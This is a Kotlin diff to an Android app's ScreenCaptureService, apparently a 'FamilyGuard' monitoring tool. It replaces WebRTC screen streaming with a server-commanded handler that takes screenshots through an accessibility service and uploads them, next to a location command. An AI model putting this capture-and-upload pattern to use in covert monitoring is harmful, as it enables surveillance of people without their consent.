@@ -222,27 +222,16 @@ class ScreenCaptureService : Service() {
 }
 
                     "SCREEN_SHARE" -> {
-                        if (webRTC?.isStreaming == true) {
-                            // Ikkinchi marta bosilsa — to'xtatamiz
-                            webRTC?.stopStream()
-                            api.updateStatus(id, "DONE", "stopped")
-                        } else {
-                            val projIntent = savedProjectionIntent
-                            if (projIntent != null && ::deviceId.isInitialized) {
-                                webRTC = WebRTCManager(
-                                    this,
-                                    deviceId,
-                                    BuildConfig.API_URL,
-                                    BuildConfig.DEVICE_SECRET
-                                )
-                                webRTC?.init()
-                                webRTC?.startStream(projIntent)
-                                api.updateStatus(id, "DONE", "streaming")
-                            } else {
-                                api.updateStatus(id, "FAILED")
-                            }
-                        }
-                    }
+    val b64 = when {
+        Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
+        FamilyGuardAccessibilityService.isEnabled() ->
+            FamilyGuardAccessibilityService.takeShot()
+        projection != null && reader != null -> capture()
+        else -> null
+    }
+    if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
+    else api.updateStatus(id, "FAILED")
+}
 
                     "LOCATION" -> {
                         val loc = LocationHelper(this).getLocation()
